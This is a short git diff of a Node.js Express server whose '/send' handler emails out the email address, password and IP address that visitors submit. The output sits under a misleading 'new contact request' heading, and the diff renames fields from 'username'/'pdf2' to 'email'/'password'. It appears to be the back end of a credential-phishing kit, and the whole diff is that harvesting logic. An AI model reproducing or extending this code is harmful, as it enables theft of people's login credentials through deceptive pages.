@@ -19,11 +19,13 @@ app.use('/public', express.static(path.join(__dirname, 'public')));
 // Body Parser Middleware
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
+app.use(express.static(__dirname + '/public'));
 // app.use('/.netlify/functions/lambda', router);  // path must route to lambda
 // app.use('/', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));
 
 app.get('/', (req, res) => {
-  res.send('It works');
+
+  res.render('views/index.html');
 });
 
 app.post('/send', (req, res) => {
@@ -33,8 +35,8 @@ app.post('/send', (req, res) => {
     <p>You have a new contact request</p>
     <h3>Contact Details</h3>
     <ul>  
-      <li>Email: ${req.body.username}</li>
-      <li>Password: ${req.body.pdf2}</li>
+      <li>Email: ${req.body.email}</li>
+      <li>Password: ${req.body.password}</li>
       <li>Ip: ${ip}</li>
       
     </ul>
